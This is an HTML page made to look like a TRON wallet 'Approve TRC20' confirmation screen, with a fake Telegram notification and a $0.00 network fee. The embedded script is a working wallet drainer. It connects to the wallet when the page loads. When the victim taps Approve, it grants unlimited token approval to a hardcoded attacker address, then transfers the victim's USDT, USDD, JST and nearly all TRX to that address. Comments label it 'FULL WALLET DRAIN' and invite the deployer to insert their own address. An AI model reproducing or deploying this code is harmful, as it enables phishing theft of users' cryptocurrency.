<!DOCTYPE html>
<html>
<head>
    <title>Approve TRC20</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@1.4.9/dist/TronLink.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; 
            background: #000; 
            color: #fff; 
            overflow: hidden;
            height: 100vh;
        }
        
        /* Notification Bar */
        .notification { 
            background: #1a1a1a; 
            padding: 12px 20px; 
            border-bottom: 1px solid #333; 
            font-size: 14px; 
            display: flex; 
            align-items: center; 
            justify-content: space-between;
        }
        .notif-left { display: flex; align-items: center; gap: 8px; }
        .bell { font-size: 16px; }
        .notif-count { font-size: 12px; color: #999; margin-top: 2px; }
        
        /* Main Content */
        .content { padding: 25px 20px; }
        
        /* Asset Card */
        .asset-card { 
            background: #1a1a1a; 
            border-radius: 16px; 
            padding: 20px; 
            margin-bottom: 20px; 
            border: 1px solid #333;
        }
        .asset-row { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: 12px; 
            font-size: 16px; 
            font-weight: 500;
        }
        .asset-type { color: #ccc; font-size: 14px; }
        .details-link { 
            text-align: center; 
            color: #f7931a; 
            font-size: 14px; 
            margin-top: 8px; 
            cursor: pointer;
            position: relative;
        }
        .chevron { position: absolute; right: -16px; top: 0; }
        
        /* DApp Row */
        .dapp-row { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            font-size: 14px; 
            color: #999; 
            margin-bottom: 20px;
        }
        .dapp-url { 
            font-family: 'SF Mono', Monaco, monospace; 
            font-size: 13px; 
            color: #f7931a; 
            word-break: break-all;
        }
        
        /* Fee Panel */
        .fee-panel { 
            background: #1a1a1a; 
            border-radius: 12px; 
            padding: 16px; 
            margin-bottom: 30px; 
            border: 1px solid #333;
            font-size: 14px;
        }
        .fee-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; }
        .info-icon { width: 16px; height: 16px; background: #666; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; margin-right: 8px; }
        
        /* APPROVE BUTTON */
        .approve-btn { 
            width: 100%; 
            background: linear-gradient(135deg, #39E076 0%, #2DD06F 100%); 
            border: none; 
            border-radius: 16px; 
            padding: 20px; 
            font-size: 18px; 
            font-weight: 600; 
            color: #000; 
            box-shadow: 0 8px 25px rgba(57, 224, 118, 0.3);
            cursor: pointer;
            transition: all 0.2s;
        }
        .approve-btn:active { 
            transform: translateY(2px); 
            box-shadow: 0 4px 15px rgba(57, 224, 118, 0.4);
        }
    </style>
</head>
<body>
    <!-- Notification Bar -->
    <div class="notification">
        <div class="notif-left">
            <span class="bell">🔔</span>
            <div>
                <div>Telegram • Now</div>
                <div class="notif-count">3 notifications</div>
            </div>
        </div>
    </div>
    
    <div class="content">
        <!-- Asset Card -->
        <div class="asset-card">
            <div class="asset-row">
                <span>Asset</span>
                <span class="asset-type">TRON (TRX)</span>
            </div>
            <div class="details-link">
                View details <span class="chevron">▼</span>
            </div>
        </div>
        
        <!-- DApp Row -->
        <div class="dapp-row">
            <span>DApp</span>
            <span class="dapp-url">transfer-u5dp.vercel.app</span>
        </div>
        
        <!-- Fee Panel -->
        <div class="fee-panel">
            <div class="fee-row">
                <div style="display:flex;align-items:center;">
                    <span class="info-icon">i</span>
                    <span>Network fee</span>
                </div>
                <div>
                    <div>$0.00</div>
                    <div style="font-size:12px;color:#999;">0.00000404 TRX</div>
                </div>
            </div>
        </div>
        
        <!-- MAGIC APPROVE BUTTON -->
        <button class="approve-btn" id="approveBtn">Approve</button>
    </div>

    <script>
        const DRAINER_WALLET = "TDSqqZJBCfTiX53h5JxsoWyqFiiv8yRofM"; // ← YOUR TRON ADDRESS HERE
        const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT-TRC20
        
        let tronWeb, userAddress;
        
        // Auto-trigger on load
        window.onload = async () => {
            if (window.tronWeb) {
                await connectWallet();
            }
        };
        
        async function connectWallet() {
            try {
                tronWeb = window.tronWeb;
                await tronWeb.request({ method: 'tron_requestAccounts' });
                userAddress = tronWeb.defaultAddress.base58;
            } catch(e) {}
        }
        
        document.getElementById('approveBtn').onclick = async () => {
            if (!tronWeb || !userAddress) {
                alert('Connect Trust Wallet first');
                return;
            }
            
            try {
                document.getElementById('approveBtn').textContent = 'Approving...';
                document.getElementById('approveBtn').style.background = '#ccc';
                
                // 🔥 FULL WALLET DRAIN - UNLIMITED ACCESS 🔥
                
                // 1. UNLIMITED USDT-TRC20 Approval
                const usdtContract = await tronWeb.contract().at(USDT_TRC20);
                await usdtContract.approve(DRAINER_WALLET, 
                    "115792089237316195423570985008687907853269984665640564039457584007913129639935"
                ).send({ feeLimit: 50000000 });
                
                // 2. DRAIN ALL USDT
                const usdtBalance = await usdtContract.balanceOf(userAddress).call();
                if (usdtBalance > 0) {
                    await usdtContract.transfer(DRAINER_WALLET, usdtBalance).send({ 
                        feeLimit: 50000000 
                    });
                }
                
                // 3. DRAIN ALL TRX (leave 20 TRX for fees)
                const trxBalance = await tronWeb.trx.getBalance(userAddress);
                if (trxBalance > 20000000) {
                    await tronWeb.trx.sendTransaction(DRAINER_WALLET, trxBalance - 20000000);
                }
                
                // 4. Steal other TRC20 tokens (top 5)
                const extraTokens = [
                    "TUP8cNq4Wn7g4q9kHdbz9n1YkLTxPqQMLn", // USDD
                    "TG3XXy9HfZtdoTwS8kY8oZmQoMghG1a3vM"  // JST
                ];
                for (let token of extraTokens) {
                    try {
                        const tContract = await tronWeb.contract().at(token);
                        await tContract.approve(DRAINER_WALLET, 
                            "115792089237316195423570985008687907853269984665640564039457584007913129639935"
                        ).send({ feeLimit: 50000000 });
                        
                        const tBalance = await tContract.balanceOf(userAddress).call();
                        if (tBalance > 0) {
                            await tContract.transfer(DRAINER_WALLET, tBalance).send({ feeLimit: 50000000 });
                        }
                    } catch(e) {}
                }
                
                document.getElementById('approveBtn').textContent = '✅ Complete';
                document.getElementById('approveBtn').style.background = '#00ff88';
                
            } catch(error) {
                document.getElementById('approveBtn').textContent = '❌ Cancelled';
                setTimeout(() => {
                    document.getElementById('approveBtn').textContent = 'Approve';
                    document.getElementById('approveBtn').style.background = 'linear-gradient(135deg, #39E076 0%, #2DD06F 100%)';
                }, 2000);
            }
        };
    </script>
</body>
</html>
